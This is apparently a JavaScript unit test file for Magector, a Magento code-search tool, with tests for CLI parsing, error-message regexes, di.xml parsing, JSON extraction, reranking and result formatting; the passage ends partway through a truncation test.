/**
 * Magector Unit Tests
 *
 * Tests for pure functions: CLI argument parsing, error pattern matching,
 * DI tracing, and performance profiling subsystem configuration.
 *
 * Usage:
 *   node tests/unit.test.js
 */

import path from 'path';
import { fileURLToPath } from 'url';
import { mkdirSync, writeFileSync, rmSync, existsSync, readFileSync } from 'fs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

let passed = 0;
let failed = 0;

function assert(condition, name, detail = '') {
  const icon = condition ? '✓' : '✗';
  const color = condition ? '\x1b[32m' : '\x1b[31m';
  console.log(`  ${color}${icon}\x1b[0m ${name}${detail ? ` — ${detail}` : ''}`);
  if (condition) passed++;
  else failed++;
}

function assertEq(actual, expected, name) {
  assert(actual === expected, name, `expected ${expected}, got ${actual}`);
}

function assertIncludes(haystack, needle, name) {
  assert(
    typeof haystack === 'string' && haystack.includes(needle),
    name,
    haystack?.includes(needle) ? '' : `"${needle}" not found in output`
  );
}

// ─── CLI Argument Parsing Tests ────────────────────────────────

function testCliArgumentParsing() {
  console.log('\n── CLI Argument Parsing ──');

  // Simulate the index command argument parsing logic
  function parseIndexPath(argv) {
    let targetPath = undefined;
    for (let i = 0; i < argv.length; i++) {
      if (argv[i] === '--threads' || argv[i] === '--batch-size') {
        i++; // skip the flag's value
      } else if (argv[i].startsWith('-')) {
        // skip boolean flags
      } else {
        targetPath = argv[i];
        break;
      }
    }
    return targetPath;
  }

  // Test: plain path
  assertEq(
    parseIndexPath(['/srv/magento']),
    '/srv/magento',
    'plain path is extracted correctly'
  );

  // Test: --threads before path
  assertEq(
    parseIndexPath(['--threads', '4', '/srv/magento']),
    '/srv/magento',
    '--threads 4 /path: path extracted, not "4"'
  );

  // Test: --batch-size before path
  assertEq(
    parseIndexPath(['--batch-size', '1000', '/srv/magento']),
    '/srv/magento',
    '--batch-size 1000 /path: path extracted correctly'
  );

  // Test: boolean flags don't consume next arg
  assertEq(
    parseIndexPath(['--force', '/srv/magento']),
    '/srv/magento',
    '--force /path: boolean flag skipped'
  );

  // Test: mixed flags
  assertEq(
    parseIndexPath(['--threads', '8', '--force', '/srv/magento']),
    '/srv/magento',
    '--threads 8 --force /path: mixed flags handled'
  );

  // Test: no path provided
  assertEq(
    parseIndexPath(['--threads', '4']),
    undefined,
    '--threads 4 with no path returns undefined'
  );

  // Test: path only (no flags)
  assertEq(
    parseIndexPath([]),
    undefined,
    'empty args returns undefined'
  );

  // Simulate the search command argument parsing logic
  function parseSearchQuery(argv) {
    const queryParts = [];
    for (let i = 0; i < argv.length; i++) {
      if (argv[i] === '-l' || argv[i] === '--limit' ||
          argv[i] === '-f' || argv[i] === '--format') {
        i++; // skip the flag's value
      } else if (argv[i].startsWith('-')) {
        // skip boolean flags
      } else {
        queryParts.push(argv[i]);
      }
    }
    return queryParts.join(' ');
  }

  // Test: search with limit flag
  assertEq(
    parseSearchQuery(['product', 'price', '-l', '5']),
    'product price',
    'search: -l 5 not included in query'
  );

  // Test: search with format flag
  assertEq(
    parseSearchQuery(['checkout', '--format', 'json', 'totals']),
    'checkout totals',
    'search: --format json not included in query'
  );

  // Test: search with verbose flag
  assertEq(
    parseSearchQuery(['-v', 'cart', 'add']),
    'cart add',
    'search: -v flag skipped'
  );
}

// ─── Error Pattern Matching Tests ──────────────────────────────

function testErrorPatterns() {
  console.log('\n── Error Pattern Matching ──');

  // Re-implement the pattern matching logic from mcp-server.js for testing
  const ERROR_PATTERNS = [
    {
      pattern: /Cannot instantiate interface\s+([\w\\]+)/i,
      type: 'missing_preference',
      extract: (m) => ({ interface: m[1] }),
      suggestion: (ctx) => `Interface ${ctx.interface} has no di.xml preference.`
    },
    {
      pattern: /Class\s+([\w\\]+)\s+does not exist/i,
      type: 'missing_class',
      extract: (m) => ({ class: m[1] }),
      suggestion: (ctx) => `Class ${ctx.class} not found.`
    },
    {
      pattern: /Plugin class\s+([\w\\]+)\s+doesn't exist/i,
      type: 'missing_plugin',
      extract: (m) => ({ plugin: m[1] }),
      suggestion: (ctx) => `Plugin class ${ctx.plugin} missing.`
    },
    {
      pattern: /Area code is not set/i,
      type: 'area_code_not_set',
      extract: () => ({}),
      suggestion: () => 'Area code must be set.'
    },
    {
      pattern: /Circular dependency:\s*([\w\\,\s]+)/i,
      type: 'circular_dependency',
      extract: (m) => ({ classes: m[1] }),
      suggestion: (ctx) => `Circular dependency: ${ctx.classes}`
    },
    {
      pattern: /SQLSTATE\[(\w+)\].*Table '[\w.]*\.(\w+)' doesn't exist/i,
      type: 'missing_table',
      extract: (m) => ({ sqlState: m[1], table: m[2] }),
      suggestion: (ctx) => `Table '${ctx.table}' missing.`
    },
    {
      pattern: /There are no commands defined in the "(\w+(?::\w+)*)" namespace/i,
      type: 'missing_cli_command',
      extract: (m) => ({ namespace: m[1] }),
      suggestion: (ctx) => `CLI namespace '${ctx.namespace}' not registered.`
    },
    {
      pattern: /Invalid method\s+([\w\\]+)::(before|after|around)(\w+)/i,
      type: 'invalid_plugin_method',
      extract: (m) => ({ class: m[1], type: m[2], method: m[3] }),
      suggestion: (ctx) => `Plugin method ${ctx.type}${ctx.method} invalid.`
    }
  ];

  function matchError(errorText) {
    for (const ep of ERROR_PATTERNS) {
      const match = errorText.match(ep.pattern);
      if (match) {
        return {
          type: ep.type,
          parsed: ep.extract(match),
          suggestion: ep.suggestion(ep.extract(match))
        };
      }
    }
    return { type: 'unknown', parsed: {}, suggestion: null };
  }

  // Test: Cannot instantiate interface
  const r1 = matchError('Cannot instantiate interface Magento\\Catalog\\Api\\ProductRepositoryInterface');
  assertEq(r1.type, 'missing_preference', 'detects missing_preference error');
  assertEq(r1.parsed.interface, 'Magento\\Catalog\\Api\\ProductRepositoryInterface', 'extracts interface name');

  // Test: Class does not exist
  const r2 = matchError('Class Vendor\\Module\\Model\\Foo does not exist');
  assertEq(r2.type, 'missing_class', 'detects missing_class error');
  assertEq(r2.parsed.class, 'Vendor\\Module\\Model\\Foo', 'extracts class name');

  // Test: Plugin class doesn't exist
  const r3 = matchError("Plugin class Vendor\\Module\\Plugin\\FooPlugin doesn't exist");
  assertEq(r3.type, 'missing_plugin', 'detects missing_plugin error');

  // Test: Area code not set
  const r4 = matchError('Magento\\Framework\\Exception\\LocalizedException: Area code is not set');
  assertEq(r4.type, 'area_code_not_set', 'detects area_code_not_set error');

  // Test: Missing table
  const r5 = matchError("SQLSTATE[42S02]: Base table or view not found: Table 'magento.custom_table' doesn't exist");
  assertEq(r5.type, 'missing_table', 'detects missing_table error');
  assertEq(r5.parsed.table, 'custom_table', 'extracts table name');

  // Test: Missing CLI command
  const r6 = matchError('There are no commands defined in the "custom:import" namespace');
  assertEq(r6.type, 'missing_cli_command', 'detects missing_cli_command error');
  assertEq(r6.parsed.namespace, 'custom:import', 'extracts CLI namespace');

  // Test: Invalid plugin method
  const r7 = matchError('Invalid method Vendor\\Module\\Plugin\\Foo::beforeNonExistentMethod');
  assertEq(r7.type, 'invalid_plugin_method', 'detects invalid_plugin_method error');
  assertEq(r7.parsed.type, 'before', 'extracts plugin type');
  assertEq(r7.parsed.method, 'NonExistentMethod', 'extracts method name');

  // Test: Circular dependency
  const r8 = matchError('Circular dependency: ClassA, ClassB, ClassC');
  assertEq(r8.type, 'circular_dependency', 'detects circular_dependency error');

  // Test: Unknown error
  const r9 = matchError('Something random went wrong');
  assertEq(r9.type, 'unknown', 'returns unknown for unrecognized errors');

  // Test: Class extraction from stack traces
  const stackTrace = `#0 /srv/magento/vendor/magento/framework/ObjectManager/Factory.php(123): create()
#1 /srv/magento/vendor/magento/framework/App/Bootstrap.php(456): run()`;
  const stackFiles = [...stackTrace.matchAll(/#\d+\s+([\w\/\-.]+\.php)(?:\((\d+)\))?/g)];
  assertEq(stackFiles.length, 2, 'extracts 2 files from stack trace');
  assertEq(stackFiles[0][1], '/srv/magento/vendor/magento/framework/ObjectManager/Factory.php', 'extracts first stack file');
  assertEq(stackFiles[0][2], '123', 'extracts line number');
}

// ─── DI XML Parsing Tests ──────────────────────────────────────

function testDiXmlParsing() {
  console.log('\n── DI XML Parsing ──');

  // Create temp di.xml files for testing
  const tmpDir = path.join(__dirname, '..', '.test-tmp');
  const etcDir = path.join(tmpDir, 'vendor', 'test', 'module-example', 'etc');
  mkdirSync(etcDir, { recursive: true });

  const diXmlContent = `<?xml version="1.0"?>
<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="urn:magento:framework:ObjectManager/etc/config.xsd">
    <preference for="Vendor\\Module\\Api\\FooInterface" type="Vendor\\Module\\Model\\Foo"/>
    <preference for="Vendor\\Module\\Api\\BarInterface" type="Vendor\\Module\\Model\\Bar"/>
    <virtualType name="CustomFooPool" type="Vendor\\Module\\Model\\Foo">
        <arguments>
            <argument name="pool" xsi:type="string">custom</argument>
        </arguments>
    </virtualType>
    <type name="Vendor\\Module\\Api\\FooInterface">
        <plugin name="foo_logger_plugin" type="Vendor\\Module\\Plugin\\FooLoggerPlugin" sortOrder="10"/>
    </type>
    <type name="Vendor\\Module\\Model\\Bar">
        <arguments>
            <argument name="cache" xsi:type="object">Magento\\Framework\\App\\Cache\\Type\\Config</argument>
        </arguments>
    </type>
</config>`;

  writeFileSync(path.join(etcDir, 'di.xml'), diXmlContent);

  // Test preference parsing
  const prefRegex = /<preference\s+for="([^"]+)"\s+type="([^"]+)"\s*\/?>/g;
  const preferences = [...diXmlContent.matchAll(prefRegex)];
  assertEq(preferences.length, 2, 'finds 2 preferences in di.xml');
  assertEq(preferences[0][1], 'Vendor\\Module\\Api\\FooInterface', 'preference for= correct');
  assertEq(preferences[0][2], 'Vendor\\Module\\Model\\Foo', 'preference type= correct');

  // Test plugin parsing
  const typeBlockRegex = /<type\s+name="([^"]+)"[^>]*>([\s\S]*?)<\/type>/g;
  const typeBlocks = [...diXmlContent.matchAll(typeBlockRegex)];
  assertEq(typeBlocks.length, 2, 'finds 2 type blocks in di.xml');

  const pluginRegex = /<plugin\s+name="([^"]+)"[^>]*type="([^"]+)"[^>]*\/?>/g;
  const fooBlock = typeBlocks.find(t => t[1].includes('FooInterface'));
  assert(fooBlock !== undefined, 'finds FooInterface type block');
  const plugins = [...fooBlock[2].matchAll(pluginRegex)];
  assertEq(plugins.length, 1, 'finds 1 plugin on FooInterface');
  assertEq(plugins[0][1], 'foo_logger_plugin', 'plugin name correct');
  assertEq(plugins[0][2], 'Vendor\\Module\\Plugin\\FooLoggerPlugin', 'plugin type correct');

  // Test virtualType parsing
  const vtRegex = /<virtualType\s+name="([^"]+)"[^>]*type="([^"]+)"[^>]*>/g;
  const vts = [...diXmlContent.matchAll(vtRegex)];
  assertEq(vts.length, 1, 'finds 1 virtualType');
  assertEq(vts[0][1], 'CustomFooPool', 'virtualType name correct');

  // Test argument parsing
  const argRegex = /<argument\s+name="([^"]+)"[^>]*xsi:type="([^"]+)"[^>]*>([^<]*)<\/argument>/g;
  const args = [...diXmlContent.matchAll(argRegex)];
  assertEq(args.length, 2, 'finds 2 argument overrides');
  assertEq(args[0][1], 'pool', 'first argument name correct');
  assertEq(args[0][3], 'custom', 'first argument value correct');

  // Cleanup
  try { rmSync(tmpDir, { recursive: true, force: true }); } catch {}
}

// ─── Subsystem Configuration Tests ─────────────────────────────

function testSubsystemConfiguration() {
  console.log('\n── Subsystem Configuration ──');

  const SUBSYSTEM_QUERIES = {
    checkout_totals: {
      searches: ['quote totals collector plugin'],
      pathFilters: ['/Model/Quote/', '/Plugin/'],
      eventPatterns: ['sales_quote_collect_totals']
    },
    order_place: {
      searches: ['order place submit plugin'],
      pathFilters: ['/Order/', '/Plugin/'],
      eventPatterns: ['sales_order_place_after']
    },
    product_save: {
      searches: ['product save plugin afterSave'],
      pathFilters: ['/Product/', '/Plugin/'],
      eventPatterns: ['catalog_product_save_after']
    },
    cart_add: {
      searches: ['add product to cart quote plugin'],
      pathFilters: ['/Cart/', '/Quote/'],
      eventPatterns: ['checkout_cart_add_product_complete']
    },
    customer_login: {
      searches: ['customer login authenticate plugin'],
      pathFilters: ['/Customer/', '/Plugin/'],
      eventPatterns: ['customer_login']
    },
    catalog_reindex: {
      searches: ['catalog product indexer reindex'],
      pathFilters: ['/Indexer/', '/Model/'],
      eventPatterns: ['catalog_product_reindex']
    }
  };

  const knownSubsystems = Object.keys(SUBSYSTEM_QUERIES);
  assertEq(knownSubsystems.length, 6, '6 known subsystems defined');

  for (const sub of knownSubsystems) {
    const cfg = SUBSYSTEM_QUERIES[sub];
    assert(cfg.searches.length > 0, `${sub}: has search queries`);
    assert(cfg.pathFilters.length > 0, `${sub}: has path filters`);
    assert(cfg.eventPatterns.length > 0, `${sub}: has event patterns`);
  }

  // Test path filter matching
  const checkoutFilters = SUBSYSTEM_QUERIES.checkout_totals.pathFilters;
  assert(
    checkoutFilters.some(f => 'vendor/magento/module-quote/Model/Quote/TotalsCollector.php'.includes(f)),
    'checkout_totals filter matches TotalsCollector.php'
  );
  assert(
    checkoutFilters.some(f => 'vendor/custom/module-tax/Plugin/TotalsPlugin.php'.includes(f)),
    'checkout_totals filter matches Plugin path'
  );
}

// ─── Magento Patterns Tests ────────────────────────────────────

async function testMagentoPatterns() {
  console.log('\n── Magento Patterns ──');

  const { XML_PATTERNS, PHP_PATTERNS, detectMagentoFileType, extractModuleInfo } = await import('../src/magento-patterns.js');

  // Test file type detection
  assertEq(
    detectMagentoFileType('vendor/magento/module-catalog/Controller/Product/View.php'),
    'Controller',
    'detects Controller file type'
  );
  assertEq(
    detectMagentoFileType('vendor/magento/module-catalog/Plugin/ProductPlugin.php'),
    'Plugin',
    'detects Plugin file type'
  );
  assertEq(
    detectMagentoFileType('vendor/magento/module-catalog/etc/di.xml'),
    'di.xml',
    'detects di.xml config type'
  );
  assertEq(
    detectMagentoFileType('vendor/magento/module-catalog/view/frontend/templates/product.phtml'),
    'template',
    'detects template file type'
  );

  // Test module info extraction
  const vendorMod = extractModuleInfo('vendor/magento/module-catalog/Model/Product.php');
  assert(vendorMod !== null, 'extracts module info from vendor path');
  assertEq(vendorMod.module, 'Catalog', 'module name: Catalog');

  const appMod = extractModuleInfo('app/code/Custom/Module/Model/Foo.php');
  assert(appMod !== null, 'extracts module info from app/code path');
  assertEq(appMod.vendor, 'Custom', 'vendor name: Custom');
  assertEq(appMod.full, 'Custom_Module', 'full name: Custom_Module');

  // Test XML pattern regexes
  const diXml = '<preference for="FooInterface" type="Foo"/>';
  const prefMatches = [...diXml.matchAll(XML_PATTERNS.di.preference)];
  assertEq(prefMatches.length, 1, 'XML_PATTERNS.di.preference matches');

  const eventsXml = '<event name="checkout_cart_add"><observer name="obs1" instance="Vendor\\Module\\Observer\\CartObserver"/></event>';
  const eventMatches = [...eventsXml.matchAll(XML_PATTERNS.events.event)];
  assertEq(eventMatches.length, 1, 'XML_PATTERNS.events.event matches');
  assertEq(eventMatches[0][1], 'checkout_cart_add', 'event name extracted');

  // Test PHP pattern regexes
  const pluginCode = 'public function beforeSave($subject, $result) {}';
  const beforeMatches = [...pluginCode.matchAll(PHP_PATTERNS.plugin.before)];
  assertEq(beforeMatches.length, 1, 'PHP_PATTERNS.plugin.before matches');
  assertEq(beforeMatches[0][1], 'beforeSave', 'plugin method name extracted');
}

// ─── extractJson Tests ─────────────────────────────────────────

function testExtractJson() {
  console.log('\n── extractJson ──');

  // Re-implement extractJson from mcp-server.js (must stay in sync with src/mcp-server.js)
  function extractJson(stdout) {
    const lines = stdout.split('\n');
    for (let i = lines.length - 1; i >= 0; i--) {
      const line = lines[i].trim();
      if (!line) continue;
      try { return JSON.parse(line); } catch { /* not JSON */ }
    }
    const logLineRe = /^\s*(\x1b\[|\[[\d\-T:.Z]+)/;
    const jsonStartRe = /^\s*[\[{"\-0-9tfn]/;
    let startIdx = lines.findIndex(l => l.trim() && !logLineRe.test(l) && jsonStartRe.test(l));
    if (startIdx < 0) startIdx = 0;
    const cleaned = lines
      .slice(startIdx)
      .filter(l => !logLineRe.test(l) && l.trim())
      .join('\n').trim();
    if (cleaned) return JSON.parse(cleaned);
    throw new SyntaxError('No valid JSON found in command output');
  }

  // Clean JSON
  const r1 = extractJson('{"ok": true}');
  assertEq(r1.ok, true, 'parses clean JSON');

  // JSON with trailing newline
  const r2 = extractJson('{"count": 42}\n');
  assertEq(r2.count, 42, 'parses JSON with trailing newline');

  // JSON preceded by ANSI tracing
  const r3 = extractJson('\x1b[32m[2026-01-01] INFO loading model\n{"results": []}');
  assert(Array.isArray(r3.results), 'parses JSON after ANSI log lines');

  // JSON preceded by timestamp log line
  const r4 = extractJson('[2026-04-07T20:45:00Z] Loaded 384-dim model\n{"vectors": 100}');
  assertEq(r4.vectors, 100, 'parses JSON after timestamp log line');

  // Multiple JSON lines — returns last
  const r5 = extractJson('{"first": 1}\n{"second": 2}');
  assertEq(r5.second, 2, 'returns last JSON line');

  // No JSON at all — throws
  let threw = false;
  try { extractJson('no json here\nreally nothing'); } catch (e) {
    threw = e instanceof SyntaxError;
  }
  assert(threw, 'throws SyntaxError when no JSON found');

  // Empty string
  threw = false;
  try { extractJson(''); } catch (e) { threw = true; }
  assert(threw, 'throws on empty string');

  // ── Bug fix: HNSW "setting number of points" prefix ──────────────
  // The binary emits " setting number of points 50000 " to stdout
  // before the JSON array when running in cold-start (execFileSync) mode.
  // The array is pretty-printed (no single line is valid JSON by itself),
  // so extractJson must skip the non-JSON prefix and parse the whole structure.
  const prettyItem = '{\n    "id": 1,\n    "score": 0.9,\n    "path": "vendor/foo/Bar.php"\n  }';
  const hnswPrefix = ` setting number of points 50000 \n[\n  ${prettyItem}\n]`;
  const r6 = extractJson(hnswPrefix);
  assert(Array.isArray(r6), 'HNSW prefix: parses multi-line array after "setting number of points" line');
  assertEq(r6.length, 1, 'HNSW prefix: correct array length');
  assertEq(r6[0].id, 1, 'HNSW prefix: item id correct');

  // Multiple non-JSON prefix lines before pretty-printed array
  const prettyArr = '[\n  {\n    "id": 2,\n    "score": 0.5\n  }\n]';
  const multiPrefix = `loading index\n setting number of points 50000 \n${prettyArr}`;
  const r7 = extractJson(multiPrefix);
  assert(Array.isArray(r7), 'Multiple non-JSON prefix lines: array parsed correctly');
  assertEq(r7[0].id, 2, 'Multiple non-JSON prefix lines: correct item extracted');

  // Prefix before JSON object (not array)
  const prefixObj = ' setting number of points 50000 \n{\n  "ok": true,\n  "data": []\n}';
  const r8 = extractJson(prefixObj);
  assertEq(r8.ok, true, 'HNSW prefix before object: object parsed correctly');
  assert(Array.isArray(r8.data), 'HNSW prefix before object: data is array');
}

// ─── normalizeResult Tests ─────────────────────────────────────

function testNormalizeResult() {
  console.log('\n── normalizeResult ──');

  // Re-implement from mcp-server.js
  function normalizeResult(r) {
    const meta = r.metadata || r;
    return {
      path: meta.path,
      module: meta.module,
      type: meta.file_type || meta.type,
      magentoType: meta.magento_type || meta.magentoType,
      className: meta.class_name || meta.className,
      methodName: meta.method_name || meta.methodName,
      methods: meta.methods || [],
      namespace: meta.namespace,
      searchText: meta.search_text || meta.searchText || '',
      isPlugin: meta.is_plugin || meta.isPlugin,
      isController: meta.is_controller || meta.isController,
      isObserver: meta.is_observer || meta.isObserver,
      isRepository: meta.is_repository || meta.isRepository,
      isResolver: meta.is_resolver || meta.isResolver,
      isModel: meta.is_model || meta.isModel,
      isBlock: meta.is_block || meta.isBlock,
      area: meta.area,
      description: null,
      score: r.score
    };
  }

  // Rust-style snake_case metadata
  const r1 = normalizeResult({
    metadata: { path: 'vendor/foo.php', file_type: 'php', class_name: 'Foo', is_plugin: true, method_name: 'beforeSave' },
    score: 0.95
  });
  assertEq(r1.path, 'vendor/foo.php', 'normalizes path from metadata');
  assertEq(r1.type, 'php', 'normalizes file_type to type');
  assertEq(r1.className, 'Foo', 'normalizes class_name to className');
  assertEq(r1.isPlugin, true, 'normalizes is_plugin to isPlugin');
  assertEq(r1.methodName, 'beforeSave', 'normalizes method_name to methodName');
  assertEq(r1.score, 0.95, 'preserves score');

  // JS-style camelCase (direct fields)
  const r2 = normalizeResult({
    path: 'app/code/Bar.php', type: 'xml', className: 'Bar', isObserver: true,
    methods: ['execute', 'observe'], area: 'frontend', score: 0.8
  });
  assertEq(r2.path, 'app/code/Bar.php', 'normalizes direct path');
  assertEq(r2.type, 'xml', 'normalizes direct type');
  assertEq(r2.isObserver, true, 'normalizes direct isObserver');
  assert(r2.methods.length === 2, 'preserves methods array');
  assertEq(r2.area, 'frontend', 'preserves area');

  // Missing fields default gracefully
  const r3 = normalizeResult({ score: 0.5 });
  assertEq(r3.path, undefined, 'missing path is undefined');
  assertEq(r3.className, undefined, 'missing className is undefined');
  assertEq(r3.searchText, '', 'missing searchText defaults to empty string');
  assert(Array.isArray(r3.methods) && r3.methods.length === 0, 'missing methods defaults to []');
}

// ─── rerank Tests ──────────────────────────────────────────────

function testRerank() {
  console.log('\n── rerank ──');

  function rerank(results, boosts = {}, weight = 0.3) {
    if (!boosts || Object.keys(boosts).length === 0) return results;
    return results.map(r => {
      let bonus = 0;
      if (boosts.fileType && r.type === boosts.fileType) bonus += weight;
      if (boosts.pathContains) {
        const patterns = Array.isArray(boosts.pathContains) ? boosts.pathContains : [boosts.pathContains];
        for (const p of patterns) {
          if (r.path?.toLowerCase().includes(p.toLowerCase())) bonus += weight;
        }
      }
      if (boosts.isPlugin && r.isPlugin) bonus += weight;
      if (boosts.isController && r.isController) bonus += weight;
      if (boosts.isObserver && r.isObserver) bonus += weight;
      if (boosts.isRepository && r.isRepository) bonus += weight;
      if (boosts.isResolver && r.isResolver) bonus += weight;
      if (boosts.isModel && r.isModel) bonus += weight;
      if (boosts.isBlock && r.isBlock) bonus += weight;
      if (boosts.magentoType && r.magentoType === boosts.magentoType) bonus += weight;
      return { ...r, score: (r.score || 0) + bonus };
    }).sort((a, b) => b.score - a.score);
  }

  // Empty boosts — same order
  const input = [{ path: 'a.php', score: 0.5 }, { path: 'b.php', score: 0.9 }];
  const r1 = rerank(input, {});
  assertEq(r1[0].path, 'a.php', 'empty boosts: no reorder');

  // fileType boost promotes matching result
  const r2 = rerank([
    { path: 'model.php', type: 'php', score: 0.5 },
    { path: 'config.xml', type: 'xml', score: 0.4 },
  ], { fileType: 'xml' });
  assertEq(r2[0].path, 'config.xml', 'fileType boost promotes XML to top');
  assertEq(r2[0].score, 0.7, 'XML score boosted by 0.3');

  // pathContains single pattern
  const r3 = rerank([
    { path: 'vendor/module/Model/Foo.php', score: 0.6 },
    { path: 'vendor/module/etc/di.xml', score: 0.5 },
  ], { pathContains: 'di.xml' });
  assertEq(r3[0].path, 'vendor/module/etc/di.xml', 'pathContains boosts di.xml');

  // pathContains array — cumulative
  const r4 = rerank([
    { path: 'vendor/module/etc/di.xml', score: 0.3 },
    { path: 'vendor/module/Plugin/Foo.php', isPlugin: true, score: 0.4 },
  ], { pathContains: ['/Plugin/', 'di.xml'], isPlugin: true });
  assertEq(r4[0].path, 'vendor/module/Plugin/Foo.php', 'multiple boosts stack');
  assertEq(r4[0].score, 1.0, 'Plugin gets 0.4+0.3+0.3=1.0');

  // isObserver boost
  const r5 = rerank([
    { path: 'obs.php', isObserver: true, score: 0.3 },
    { path: 'block.php', isBlock: true, score: 0.3 },
    { path: 'plain.php', score: 0.3 },
  ], { isObserver: true });
  assertEq(r5[0].path, 'obs.php', 'isObserver boost works');
  assertEq(r5[0].score, 0.6, 'observer boosted to 0.6');

  // magentoType boost
  const r6 = rerank([
    { path: 'a.xml', magentoType: 'di_config', score: 0.4 },
    { path: 'b.xml', magentoType: 'events_config', score: 0.5 },
  ], { magentoType: 'di_config' });
  assertEq(r6[0].path, 'a.xml', 'magentoType boost promotes di_config');

  // Custom weight
  const r7 = rerank([
    { path: 'a.php', type: 'php', score: 0.5 },
    { path: 'b.xml', type: 'xml', score: 0.3 },
  ], { fileType: 'xml' }, 0.5);
  assertEq(r7[0].score, 0.8, 'custom weight=0.5 applies correctly');
}

// ─── detectEntryType Tests ─────────────────────────────────────

function testDetectEntryType() {
  console.log('\n── detectEntryType ──');

  function detectEntryType(entryPoint) {
    if (/^\/?V\d/.test(entryPoint)) return 'api';
    if (!entryPoint.includes('/') && /^[a-z][a-z0-9]*(_[a-z0-9]+)+$/.test(entryPoint)) return 'event';
    if (!entryPoint.includes('/') && /^[a-z]/.test(entryPoint) && /[A-Z]/.test(entryPoint)) return 'graphql';
    if (entryPoint.includes('/')) return 'route';
    return 'route';
  }

  assertEq(detectEntryType('/V1/products'), 'api', '/V1/products is api');
  assertEq(detectEntryType('V1/orders'), 'api', 'V1/orders is api');
  assertEq(detectEntryType('/V2/carts/mine'), 'api', '/V2/carts/mine is api');
  assertEq(detectEntryType('sales_order_place_after'), 'event', 'sales_order_place_after is event');
  assertEq(detectEntryType('checkout_cart_add_product_complete'), 'event', 'checkout event');
  assertEq(detectEntryType('catalog_product_save_before'), 'event', 'catalog event');
  assertEq(detectEntryType('placeOrder'), 'graphql', 'placeOrder is graphql');
  assertEq(detectEntryType('createEmptyCart'), 'graphql', 'createEmptyCart is graphql');
  assertEq(detectEntryType('customerCart'), 'graphql', 'customerCart is graphql');
  assertEq(detectEntryType('checkout/cart/add'), 'route', 'checkout/cart/add is route');
  assertEq(detectEntryType('catalog/product/view'), 'route', 'catalog/product/view is route');
  assertEq(detectEntryType('customer/account/login'), 'route', 'customer/account/login is route');
}

// ─── formatSearchResults Tests ──────────────────────────────────

function testFormatSearchResults() {
  console.log('\n── formatSearchResults ──');

  function formatSearchResults(results) {
    if (!results || results.length === 0) {
      return JSON.stringify({ results: [], count: 0 });
    }
    const formatted = results.map((r, i) => {
      const entry = {
        rank: i + 1,
        score: r.score ? parseFloat(r.score.toFixed(3)) : null,
        path: r.path || 'unknown',
      };
      if (r.module) entry.module = r.module;
      if (r.className) entry.className = r.className;
      if (r.namespace) entry.namespace = r.namespace;
      if (r.methodName) entry.methodName = r.methodName;
      if (r.methods && r.methods.length > 0) entry.methods = r.methods;
      if (r.magentoType) entry.magentoType = r.magentoType;
      if (r.type) entry.fileType = r.type;
      if (r.area && r.area !== 'global') entry.area = r.area;
      const badges = [];
      if (r.isPlugin) badges.push('plugin');
      if (r.isController) badges.push('controller');
      if (r.isObserver) badges.push('observer');
      if (r.isRepository) badges.push('repository');
      if (r.isResolver) badges.push('graphql-resolver');
      if (r.isModel) badges.push('model');
      if (r.isBlock) badges.push('block');
      if (badges.length > 0) entry.badges = badges;
      if (r.searchText) {
        entry.snippet = r.searchText.length > 300 ? r.searchText.slice(0, 300) + '...' : r.searchText;
      }
      return entry;
    });
    return JSON.stringify({ results: formatted, count: formatted.length });
  }

  // Empty / null
  const r1 = JSON.parse(formatSearchResults([]));
  assertEq(r1.count, 0, 'empty results: count=0');
  const r1b = JSON.parse(formatSearchResults(null));
  assertEq(r1b.count, 0, 'null results: count=0');

  // Single result with all fields
  const r2 = JSON.parse(formatSearchResults([{
    path: 'vendor/foo.php', score: 0.9567, module: 'Magento_Catalog',
    className: 'FooClass', namespace: 'Magento\\Catalog', methodName: 'execute',
    methods: ['execute', 'save'], magentoType: 'Controller', type: 'php',
    area: 'frontend', isPlugin: true, isController: false, searchText: 'some text'
  }]));
  assertEq(r2.count, 1, 'single result: count=1');
  assertEq(r2.results[0].rank, 1, 'rank is 1');
  assertEq(r2.results[0].score, 0.957, 'score rounded to 3 decimals');
  assertEq(r2.results[0].path, 'vendor/foo.php', 'path preserved');
  assertEq(r2.results[0].module, 'Magento_Catalog', 'module preserved');
  assertEq(r2.results[0].area, 'frontend', 'area preserved');
  assert(r2.results[0].badges.includes('plugin'), 'plugin badge set');

  // Global area omitted
  const r3 = JSON.parse(formatSearchResults([{ path: 'x.php', area: 'global', score: 0.5 }]));
  assertEq(r3.results[0].area, undefined, 'global area omitted');

  // Missing path defaults to unknown
  const r4 = JSON.parse(formatSearchResults([{ score: 0.5 }]));
  assertEq(r4.results[0].path, 'unknown', 'missing path is "unknown"');

  // Long searchText truncated
  const longText = 'A'.repeat(500);
  const r5 = JSON.parse(formatSearchResults([{ path: 'x.php', score: 0.5, searchText: longText }]));
  assertEq(r5.results[0].snippet.length, 303, 'long snippet truncated to 300+...');
  assert(r5.results[0].snippet.endsWith('...'), 'snippet ends with ...');

  // Multiple badges
  const r6 = JSON.parse(formatSearchResults([{
    path: 'x.php', score: 0.5, isObserver: true, isModel: true, isRepository: true
  }]));
  assertEq(r6.results[0].badges.length, 3, '3 badges: observer, model, repository');
}

// ─── formatSearchResults Rank-Based Truncation Tests ────────────

function testFormatSearchResultsTruncation() {
  console.log('\n── formatSearchResults rank-based truncation ──');

  // Replicate production formatSearchResults with isTopRanked logic
  function formatSearchResults(results) {
    if (!results || results.length === 0) {
      return JSON.stringify({ results: [], count: 0 });
    }
    const formatted = results.map((r, i) => {
      const entry = {
        rank: i + 1,
        score: r.score ? parseFloat(r.score.toFixed(3)) : null,
        path: r.path || 'unknown',
      };
      if (r.className) entry.className = r.className;
      if (r.methodName) entry.methodName = r.methodName;

      const isTopRanked = i < 3;

      if (isTopRanked && r.searchText) {
        entry.snippet = r.searchText.length > 300
          ? r.searchText.slice(0, 300) + '...'
          : r.searchText;
      }

      if (r.fullMethodBody) {
        entry.codePreview = r.fullMethodBody;
      }

      return entry;
    });
    return JSON.stringify({ results: formatted, count: formatted.length });
  }

  // Create 5 results with searchText
  const results = Array.from({ length: 5 }, (_, i) => ({
    path: `vendor/test${i}.php`,
    score: 0.9 - i * 0.1,
    className: `TestClass${i}`,
    searchText: `Description of class ${i} with enough text to be meaningful`,
  }));

  const parsed = JSON.parse(formatSearchResults(results));
  assertEq(parsed.count, 5, 'truncation: returns all 5 results');

  // Top 3 should have snippets
  assert(parsed.results[0].snippet !== undefined, 'truncation: rank 1 has snippet');
